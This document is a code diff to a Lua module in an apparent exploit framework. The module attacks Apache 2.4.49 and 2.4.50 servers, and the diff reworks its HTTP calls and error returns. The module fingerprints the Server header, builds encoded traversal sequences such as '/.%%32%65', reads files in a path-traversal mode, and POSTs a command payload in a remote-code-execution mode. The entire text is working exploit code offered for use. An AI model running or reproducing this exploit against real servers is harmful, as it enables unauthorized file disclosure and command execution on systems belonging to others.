@@ -66,14 +66,17 @@ return {
         ["User-Agent"] = useragent,
       }
 
-      local response, err = http.get(cfg)
+      explo.trace("Sending HTTP request to " .. w)
+      explo.trace("type(cfg): " .. type(cfg))
+      explo.trace("type(cfg.url): " .. type(cfg.url))
+      local response, err = http.request(cfg)
       if err then
         explo.error("HTTP request failed: " .. err)
         return
       end
       if not response then
         explo.error("No response received from " .. w)
-        return
+        return -1
       end
       local dds = ""
       if response.headers["Server"] and response.headers["Server"]:match("Apache/2.4.49") then
@@ -84,12 +87,12 @@ return {
         dds = "/.%%32%65"
       else
         explo.error("Target " .. w .. " is not running Apache 2.4.49 or 2.4.50")
-        return
+        return -1
       end
 
       if mode == "pt" then
         cfg.url = cfg.url .. dds:rep(dds_count) .. pt
-        response, err = http.get(cfg)
+        response, err = http.request(cfg)
         if err then
           explo.error("HTTP request failed: " .. err)
           return
@@ -109,7 +112,8 @@ return {
       if mode == "rce" then
         cfg.url = cfg.url .. dds:rep(dds_count) .. rce
         cfg.body = payload_prefix .. " " .. payload
-        local rce_response = http.post(cfg)
+        cfg.method = "POST"
+        local rce_response = http.request(cfg)
         if not rce_response then
           explo.error("No response received from RCE on " .. w)
           return
